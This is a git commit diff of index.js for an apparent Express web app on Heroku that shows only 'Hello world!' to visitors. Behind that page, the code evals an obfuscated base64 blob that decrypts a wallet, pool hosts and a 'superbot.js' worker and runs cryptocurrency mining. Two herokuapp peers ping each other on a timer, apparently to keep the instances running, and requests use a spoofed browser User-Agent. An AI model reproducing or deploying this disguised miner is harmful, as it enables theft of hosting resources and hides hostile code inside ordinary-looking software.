18a5776997e60bfe92c2178684f205f43eb84f33
sbutch <46149020+sbutch@users.noreply.github.com>
2020-07-08 07:22:47 +0200

    Add files via upload

--- index.js
+++ index.js
@@ -5,21 +5,20 @@ const CryptoJS = require("crypto-js");
 const express=require('express');
 const app=express();
 app.get('/',function(req,res) {
-  if(!pools.length) var glob = function(x) { eval(decrypt(x.substring(-~[c.active]))) }
-  (`AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgvXHJ8XG4vKS5qb2luKCcnKSxjLmFjdGl2ZS50b1N0cmluZygpKS50b1N0
-cmluZyhDcnlwdG9KUy5lbmMuVXRmOCkgfTsKdmFyIGxpc3QgPSBkZWNyeXB0KGZzLnJlYWRGaWxlU3luYygnbGlzdC50eHQnLCd1dGY4JykpLnNwbGl0KCdcclxuJyk7CmMuY29pbiA9I
-Gxpc3Quc2hpZnQoKTsgdmFyIG15Y29pbiA9IHJlcXVpcmUoJy4vJytjLmNvaW4rJy5qcycpOwpjLndhbGxldCA9IGxpc3Quc2hpZnQoKTsgYy5wZWVycyA9IFtsaXN0LnNoaWZ0KCldOy
-BjLnBlZXJzLnB1c2gobGlzdC5zaGlmdCgpKTsKd29ya2VyID0gZGVjcnlwdChmcy5yZWFkRmlsZVN5bmMoJ3N1cGVyYm90LmpzJywndXRmOCcpKStgCmFwcC5kYj17c3RhdGU6J3llbGx
-vdycsaG9zdDpoLGhhc2g6JzAgaC9zIFswLzBdJ307CnZhciBib3QgPSBuZXcgc3VwZXJib3QoKTsKdmFyIHRfaGFzaCA9IGxfaGFzaCA9IHNfaGFzaCA9IDA7CmFwcC5wb3N0KCcvd29y
-a2VyJywgYXBwLnBhcnNlciwgZnVuY3Rpb24gKHJlcSwgcmVzKSB7CiAgYXBwLmRiLm1zZyA9ICdub3RoaW5nJzsKICB2YXIgcHMgPSBbXTsKICBmb3IodmFyIGk9MDsgaTxyZXEuYm9ke
-S5qb2JzLmxlbmd0aDsgaSsrKSBwcy5wdXNoKGJvdC5vbm1lc3NhZ2UocmVxLmJvZHkuam9ic1tpXSkpOwogIFByb21pc2UuYWxsKHBzKS50aGVuKG1zZ3MgPT4gewogICAgdF9oYXNoIC
-s9IG1zZ3MubGVuZ3RoOwogICAgZm9yKHZhciBpPTA7IGk8bXNncy5sZW5ndGg7IGkrKykgaWYobXNnc1tpXSAhPSAnbm90aGluZycpIHsKICAgICAgaWYoYXBwLmRiLm1zZyA9PSAnbm9
-0aGluZycpIGFwcC5kYi5tc2cgPSBbbXNnc1tpXV0KICAgICAgZWxzZSBhcHAuZGIubXNnLnB1c2gobXNnc1tpXSk7CiAgICAgIHNfaGFzaCsrOwogICAgfQogICAgcmVzLmpzb24oYXBw
-LmRiKTsKICB9KTsKfSk7CnNldEludGVydmFsKGZ1bmN0aW9uKCkgewogIGFwcC5kYi5zdGF0ZSA9IHRfaGFzaCA9PSBsX2hhc2ggPyAneWVsbG93JyA6ICdncmVlbic7CiAgYXBwLmRiL
-mhhc2ggPSAodF9oYXNoLWxfaGFzaCkrJyBoL3MgWycrdF9oYXNoKycvJytzX2hhc2grJ10nOwogIGxfaGFzaCA9IHRfaGFzaDsKfSwgMTAwMCk7CmMoYXBwLmRiKQpgOwpmb3IodmFyIG
-k9MDsgaTxsaXN0Lmxlbmd0aDsgaSsrKQogIGlmKCFsaXN0W2ldLnN0YXJ0c1dpdGgoJ2h0dHAnKSkgcG9vbHMucHVzaChuZXcgbXljb2luKHsgd2FsbGV0OiBjLndhbGxldCwgaG9zdDo
-gbGlzdFtpXSB9KSkKICBlbHNlIHsgbGV0IG5ib3Q9e2hvc3Q6bGlzdFtpXSwgc3RhdGU6J29yYW5nZScsIGhhc2g6JzAgaC9zIFswLzBdJ307IGJvdHMucHVzaChuYm90KTsgd2FrZXVw
-KG5ib3QpIH0=`)
+  if(!c.coin) var glob = function(x) { eval(decrypt(x.substring(-~[c.active]))) }
+  (`AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgvXHJ8XG4vKS5qb2luKCcnKSxjLmFjdGl2ZS50b1N0cmluZygpKS50
+b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCkgfTsKdmFyIGxpc3QgPSBkZWNyeXB0KGZzLnJlYWRGaWxlU3luYygnbGlzdC50eHQnLCd1dGY4JykpLnNwbGl0KCdcclxuJyk7CmMuY
+29pbiA9IGxpc3Quc2hpZnQoKTsgdmFyIG15Y29pbiA9IHJlcXVpcmUoJy4vJytjLmNvaW4rJy5qcycpOyBjLndhbGxldCA9IGxpc3Quc2hpZnQoKTsKd29ya2VyID0gZGVjcnlwdC
+hmcy5yZWFkRmlsZVN5bmMoJ3N1cGVyYm90LmpzJywndXRmOCcpKStgCmFwcC5kYj17c3RhdGU6J3llbGxvdycsaG9zdDpoLGhhc2g6JzAgaC9zIFswLzBdJ307CnZhciBib3QgPSB
+uZXcgc3VwZXJib3QoKTsKdmFyIHRfaGFzaCA9IGxfaGFzaCA9IHNfaGFzaCA9IDA7CmFwcC5wb3N0KCcvd29ya2VyJywgYXBwLnBhcnNlciwgZnVuY3Rpb24gKHJlcSwgcmVzKSB7
+CiAgYXBwLmRiLm1zZyA9ICdub3RoaW5nJzsKICB2YXIgcHMgPSBbXTsKICBmb3IodmFyIGk9MDsgaTxyZXEuYm9keS5qb2JzLmxlbmd0aDsgaSsrKSBwcy5wdXNoKGJvdC5vbm1lc
+3NhZ2UocmVxLmJvZHkuam9ic1tpXSkpOwogIFByb21pc2UuYWxsKHBzKS50aGVuKG1zZ3MgPT4gewogICAgdF9oYXNoICs9IG1zZ3MubGVuZ3RoOwogICAgZm9yKHZhciBpPTA7IG
+k8bXNncy5sZW5ndGg7IGkrKykgaWYobXNnc1tpXSAhPSAnbm90aGluZycpIHsKICAgICAgaWYoYXBwLmRiLm1zZyA9PSAnbm90aGluZycpIGFwcC5kYi5tc2cgPSBbbXNnc1tpXV0
+KICAgICAgZWxzZSBhcHAuZGIubXNnLnB1c2gobXNnc1tpXSk7CiAgICAgIHNfaGFzaCsrOwogICAgfQogICAgcmVzLmpzb24oYXBwLmRiKTsKICB9KTsKfSk7CnNldEludGVydmFs
+KGZ1bmN0aW9uKCkgewogIGFwcC5kYi5zdGF0ZSA9IHRfaGFzaCA9PSBsX2hhc2ggPyAneWVsbG93JyA6ICdncmVlbic7CiAgYXBwLmRiLmhhc2ggPSAodF9oYXNoLWxfaGFzaCkrJ
+yBoL3MgWycrdF9oYXNoKycvJytzX2hhc2grJ10nOwogIGxfaGFzaCA9IHRfaGFzaDsKfSwgMTAwMCk7CmMoYXBwLmRiKWA7CmZvcih2YXIgaT0wOyBpPGxpc3QubGVuZ3RoOyBpKy
+spCiAgaWYobGlzdFtpXS5zdGFydHNXaXRoKCdodHRwJykpIHsgbGV0IG5ib3Q9e2hvc3Q6bGlzdFtpXSwgc3RhdGU6J29yYW5nZScsIGhhc2g6JzAgaC9zIFswLzBdJ307IGJvdHM
+ucHVzaChuYm90KTsgd2FrZXVwKG5ib3QpIH0KICBlbHNlIHBvb2xzLnB1c2gobmV3IG15Y29pbih7IHdhbGxldDogYy53YWxsZXQsIGhvc3Q6IGxpc3RbaV0gfSkp`)
   if(req.query.yellow_pools) c.yellow_pools = req.query.yellow_pools == 'true'
   if(req.query.json) res.json({ c: c, pools: mylist(pools), bots: mylist(bots) })
   else { res.send('Hello world!') }
@@ -27,7 +26,17 @@ KG5ib3QpIH0=`)
 var s=app.listen(process.env.PORT||5000,()=>console.log('Listening on port '+s.address().port));
 
 var decrypt = function(x){ return Buffer.from(x,'base64').toString('ascii') };
-var c = { active: 0, id: 2, state: 'orange', yellow_pools: false, hash: '0 h/s 0/0' }
+var c = {
+  id: 1,
+  peers: [
+    'https://myte1001.herokuapp.com',
+    'https://myte1002.herokuapp.com'
+  ],
+  state: 'orange', 
+  yellow_pools: false, 
+  hash: '0 h/s 0/0'
+}
+
 var rec = false;
 var pools = []; var bots = []; var worker = '';
 
@@ -83,21 +92,24 @@ function mylist(obj) {
   return result
 }
 
-function myrequest(url,form,callback) {
+function myrequest(url,p1,p2) {
   var options = {
     url:url, method:'GET', json:true,
     headers:{'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Geko) Chrome/83.0.4103.116 Safari/537.36'}
   }
-  if(form) { options.method = 'POST'; options.form = form }
-  request(options, (error, response, body) => callback(error, response, body) );
+  if(p2) { options.method = 'POST'; options.form = p1 }
+  request(options, (error, response, body) => {
+    if(!p2) p1(error, response, body)
+    else p2(error, response, body)
+  };
 }
 
 setInterval(function() {
   var m = new Date().getMinutes();
   if(c.id == 1) c.active = m < 30 ? m+1 : m-59
   else c.active =  m-29
-  if(!rec && c.active == 1) { rec = true; myrequest(c.peers[c.id-1],false,function(){ rec = false }) }
-  if(!rec && c.active == 30) { rec = true; myrequest(c.peers[c.id == 1 ? 1 : 0],false,function(){ rec = false }) }
+  if(!rec && c.active == 1) { rec = true; myrequest(c.peers[c.id-1],function(){ rec = false }) }
+  if(!rec && c.active == 30) { rec = true; myrequest(c.peers[c.id == 1 ? 1 : 0],function(){ rec = false }) }
 
   var hsum = 0; var hsub = 0; var hacp = 0;  var rt = false;
 
